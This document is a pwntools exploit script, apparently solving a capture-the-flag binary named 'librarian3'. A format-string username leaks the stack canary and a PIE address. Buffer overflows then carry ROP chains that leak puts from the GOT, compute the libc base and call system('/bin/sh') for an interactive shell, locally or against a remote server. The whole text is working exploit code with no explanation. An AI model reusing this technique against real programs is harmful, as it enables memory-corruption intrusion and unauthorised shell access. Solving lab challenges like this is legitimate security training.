from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
break *main + 208
continue
'''.format(**locals())

exe = './challenge/librarian3'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

pop_rdi_ret = 0x0000000000001453
ret = 0x000000000000101a

p.sendlineafter(b'Enter your username: ', b'%17$16lx%21$16lx')
p.sendlineafter(b'Enter your passcode: ', str(0x6b8b4567).encode())
p.recvuntil(b'Logged in as:\n')
leak = p.recvline()[:-1].decode()
canary = int(leak[:16], 16)
pie = int(leak[16:], 16)

info("Leak canary: " + hex(canary))
info("Leak pie: " + hex(pie))
base = elf.address = pie - elf.sym.main 

p.sendline(b'6')
p.sendline(flat(
    b'a'*40,
    canary,
    0,
    base + pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)); p.recvuntil(b'Thanks!\n')

leak = int.from_bytes(p.recvline()[:-1], 'little')
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts

p.sendlineafter(b'Enter your username: ', b'%17$16lx%21$16lx')
p.sendlineafter(b'Enter your passcode: ', str(0x327b23c6).encode())
p.sendline(b'6')
p.sendline(flat(
    b'a'*40,
    canary,
    0,
    base + pop_rdi_ret,
    libc.search(b'/bin/sh\x00').__next__(),
    base + ret,
    libc.sym.system
)); p.recvuntil(b'Thanks!\n')

p.interactive()
